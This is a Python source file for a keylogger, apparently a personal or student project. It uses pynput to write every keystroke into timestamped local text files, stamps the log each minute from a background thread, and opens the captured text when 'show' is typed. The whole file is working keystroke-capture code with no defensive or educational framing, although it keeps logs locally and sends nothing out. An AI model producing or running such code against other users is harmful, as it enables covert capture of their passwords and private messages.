import os
import threading
from pynput.keyboard import Listener, Key
from datetime import datetime
import time

now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
filename = ('keys_' + now + '.txt')
Last_listen_filename = 'Last_listen.txt'
Current_listening_name = 'listening.txt'
Current_listening = []

def Show_listening():
    if os.path.exists(Last_listen_filename):
        with open(Last_listen_filename, "r", encoding='utf-8') as showlestfile:
            os.startfile("C:/Users/USER/PycharmProjects/PythonProject/Myprojects/.venv/Last_listen.txt")  # print(showlestfile.read())
    else:
        with open(Current_listening_name, "r", encoding='utf-8') as showfile:
            os.startfile("C:/Users/USER/PycharmProjects/PythonProject/Myprojects/.venv/listening.txt")  # print(showfile.read())

def timestemp_everyminute():
    while True:
        timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
        with open(filename, "a", encoding='utf-8') as file:
            file.write(f'\n~{timestemp}:~\n')
        time.sleep(60)

def on_press(key):
    try:
        text_key = (key.char)
    except:
        text_key = (f' [{key}]')

    Current_listening.append(text_key)

    with open(filename, "a", encoding='utf-8') as file:
        file.write(text_key)
        file.flush()

    with open(Current_listening_name, "a", encoding='utf-8') as showfile:
        showfile.write(text_key)
        showfile.flush()

    if ''.join(Current_listening[-4:]) == ('show'):
        Show_listening()

    if key == Key.esc:  # רק לשימוש נוח, לא רלוונטי לפרוייקט
        return False  # רק לשימוש נוח, לא רלוונטי לפרוייקט

def start_Thread_timestemp():
    Thread_timestemp_everyminute = threading.Thread(target=timestemp_everyminute, daemon=True)
    Thread_timestemp_everyminute.start()

def start_listening():
    with Listener(on_press=on_press) as listener:
        listener.join()

def file_organization():
    if os.path.exists(Last_listen_filename):
        os.remove(Last_listen_filename)

    os.rename(Current_listening_name, Last_listen_filename)

def main():
    start_Thread_timestemp()
    start_listening()
    file_organization()

